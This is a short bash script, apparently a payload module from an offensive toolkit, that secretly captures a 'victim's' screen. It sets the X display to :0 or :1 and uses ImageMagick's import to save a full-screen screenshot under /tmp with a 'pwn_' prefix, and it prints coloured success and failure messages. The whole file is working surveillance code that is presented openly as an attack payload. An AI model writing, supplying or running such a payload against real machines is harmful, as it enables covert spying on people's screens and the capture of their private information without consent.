#!/bin/bash
# Made by Optixal

# PAYLOAD INFO:
# Takes a screenshot of victim's screen

# VICTIM'S REQUIREMENTS:
# ImageMagick's import program

# MISC:
# Display variable's format: hostname:D.S
# Hostname is the computer name, omit for localhost
# D is a sequence number for the number of displays connected to the computer
# S is the screen number, as each display can have multiple screens, omit for default 0

SIGNATURE=/tmp/pwn_

status="\033[1m\033[94m[*]\033[0m"
good="\033[1m\033[92m[+]\033[0m"
error="\033[1m\033[91m[-]\033[0m"
money="\033[1m\033[92m[$]\033[0m"

((DISPLAY=":0" && export DISPLAY && import -window root ${SIGNATURE}ss_$(date +"%Y-%m-%d-%T").png 2> /dev/null) && echo -e "$good Successfully captured screenshot on display 0!") || (echo -e "$error Display 0 didn't seem to work, trying display 1..." && (DISPLAY=":1" && export DISPLAY && import -window root ${SIGNATURE}ss_$(date +"%Y-%m-%d-%T").png 2> /dev/null) && echo -e "$good Successfully captured screenshot on display 1!")

